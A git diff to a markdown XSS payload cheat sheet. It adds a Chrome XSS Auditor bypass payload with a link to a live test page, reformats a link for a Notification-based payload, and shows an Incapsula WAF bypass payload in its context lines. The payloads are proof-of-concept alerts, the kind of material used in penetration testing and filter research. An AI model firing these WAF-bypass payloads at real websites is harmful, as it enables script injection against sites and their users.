@@ -644,6 +644,12 @@ Exotic payloads
 
 ## Common WAF Bypass
 
+### Chrome Auditor - 9th august
+```javascript
+</script><svg><script>alert(1)-%26apos%3B
+```
+Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)
+
 ### Incapsula WAF Bypass - 8th march
 ```javascript
 anythinglr00</script><script>alert(document.domain)</script>uxldz
@@ -663,9 +669,9 @@ Use notification box instead of an alert - by [@brutelogic](https://twitter.com/
 Note : it requires user permission
 ```
 Notification.requestPermission(x=>{new(Notification)(1)})
-
-Try here : https://brutelogic.com.br/xss.php?c3=%27;Notification.requestPermission(x=>%7Bnew(Notification)(1)%7D)//
 ```
+
+Try here : [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c3=%27;Notification.requestPermission(x=>%7Bnew(Notification)(1)%7D)//)
 
 
 ## Thanks to
